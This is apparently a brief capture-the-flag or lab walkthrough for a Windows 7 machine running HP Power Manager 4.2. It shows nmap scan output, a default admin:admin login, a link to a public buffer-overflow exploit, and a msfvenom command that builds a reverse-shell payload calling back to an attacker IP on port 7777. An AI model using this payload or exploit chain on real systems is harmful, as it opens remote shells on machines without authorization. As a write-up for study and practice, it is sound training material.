Level: Easy

nmap output

```
80/tcp    open   http        syn-ack ttl 125 GoAhead WebServer
| http-title: HP Power Manager
|_Requested resource was http://192.168.240.45/index.asp
|_http-server-header: GoAhead-Webs
| http-methods: 
|_  Supported Methods: GET HEAD
135/tcp   open   msrpc       syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open   netbios-ssn syn-ack ttl 125 Windows 7 Ultimate N 7600 netbios-ssn
335/tcp   closed unknown     reset ttl 125
3389/tcp  open   tcpwrapped  syn-ack ttl 125
|_ssl-date: 2025-12-17T07:53:15+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=kevin
| Issuer: commonName=kevin
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-12-16T07:45:23
| Not valid after:  2026-06-17T07:45:23
| MD5:   7cdf:707c:16be:d3fa:b0c6:4a14:ba6b:b90c
| SHA-1: 4456:a9a0:c34d:4343:3e3c:3869:d7d6:09f1:0510:7184
| -----BEGIN CERTIFICATE-----
| MIICzjCCAbagAwIBAgIQX/Prw0aBP7JDq3izGM8CjzANBgkqhkiG9w0BAQUFADAQ
| MQ4wDAYDVQQDEwVrZXZpbjAeFw0yNTEyMTYwNzQ1MjNaFw0yNjA2MTcwNzQ1MjNa
| MBAxDjAMBgNVBAMTBWtldmluMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAwTe5KwVeXNz0EZZbzMxp/iIAZ9d4G4lX/8Yq/7mdKSq3bZtJzC/G7+UdNgoW
| jsDLgVP2zYH6k1ZWeWZ3CZA53c5Vz+/J8YJ6Vk2C+BqFKmYETgQvZM+P+BElTE5n
| Xos38zhSTs8WwEkysc+4EeSV0Bx9HdYQhottM56jTOMkAc1Cfis66Cj1F89W19Ep
| a3xJxLe0/SARYR8/+6CuD4hHQtlIFYlLgqAwlQxrK0CkWXw1Q5vuPLbttnPJDqJX
| AQMWsv6oX1V71XZqgB2fg3rECRzi1XUpgkalTaSeSJ6ZtXT1T/sLXzTuolHqdhLv
| QB7Uclzlc2AUYmqot2LZslqGAQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAKPOPzdtDt0Ly+mE/hgI
| wwHFAVgR4MqFzQvL1Jx0Kws6b1xNhypdFqhdViZ2rNho1V2jZNzCOBZYhfz4CArT
| 6eOdPzGi0itiXZY7LSHPNzabPy83Cj5ndycbRoRoW04sX9rSMslAN5wZ+rFkX+fV
| ApbaaSnam8vCKXcAYtglhNQOY4eXOIRB9y5tatbD8/NhORsSIifLXWc8Xcwsejtb
| xsYcqaWX4EWy//uup4MYIINPeuRIdMb7fRCC7UDU8jRm8V9rHLCc/TkOaT/uvldi
| /ONZi6nTKYhAfoBqKEL9rfgBbJtKs7GMif87euotmiVnUjuevnIDic1TScxItl3P
| 3t8=
|_-----END CERTIFICATE-----
3573/tcp  open   tag-ups-1?  syn-ack ttl 125
49152/tcp open   msrpc       syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open   msrpc       syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open   msrpc       syn-ack ttl 125 Microsoft Windows RPC
49155/tcp open   msrpc       syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open   msrpc       syn-ack ttl 125 Microsoft Windows RPC
49159/tcp open   msrpc       syn-ack ttl 125 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 4h00m00s, median: -1s
| smb2-time: 
|   date: 2025-12-17T07:53:00
|_  start_date: 2025-12-17T07:46:08
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-16T23:53:00-08:00
| nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:f1:e4 (VMware)
| Names:
|   KEVIN<20>            Flags: <unique><active>
|   KEVIN<00>            Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00:50:56:ab:f1:e4:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40946/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 62904/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55358/udp): CLEAN (Timeout)
|   Check 4 (port 64819/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
```

smb guest login available 

Port 80 -> HP Power Manager
Default credentials -> admin:admin works

![](../../Assets/Screenshot%202025-12-17%20at%203.52.13%20PM.png)

Under help -> HP Power Manager 4.2 build 7

https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3/blob/master/hp_pm_exploit_p3.py

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.219 LPORT=7777  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
```
we need to be careful about the bad codes also

modify the shell and run it 

we get a shell
